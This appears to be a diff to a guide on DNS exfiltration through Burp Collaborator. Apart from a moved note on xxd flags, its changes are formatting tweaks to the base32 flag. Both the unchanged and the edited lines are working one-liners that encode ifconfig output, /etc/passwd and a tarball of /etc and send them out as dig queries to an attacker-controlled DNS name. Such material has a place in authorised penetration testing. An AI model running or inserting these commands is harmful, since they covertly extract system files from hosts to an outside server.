@@ -20,11 +20,13 @@ Note that if results are unreliable you can specify the name or IP of the DNS se
 
 In the examples below: `<DNS Name>` is the random name provided by Burp Collaborator (AKA, the interaction ID). For example: use `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`.
 
+For `base32`, the `-w63` flag specifies line wrapping at 63 bytes. For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
+
 ### Send STDOUT from a command:
 
 base32:
 ```
-ifconfig | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+ifconfig | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Hex:
@@ -39,11 +41,9 @@ dns-parse.py <DNS Name> (query.log|collaborator.log)
 
 ### Exfiltrate a file:
 
-For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
-
-base32:
+#### base32
 ```
-base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+base32 -w63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Hex:
@@ -60,7 +60,7 @@ dns-parse.py <DNS Name> (query.log|collaborator.log)
 
 base32:
 ```
-gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+gzip - < /etc/passwd | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Hex:
@@ -79,7 +79,7 @@ Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It 
 
 base32:
 ```
-tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+tar czf - /etc | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
 
 Hex:
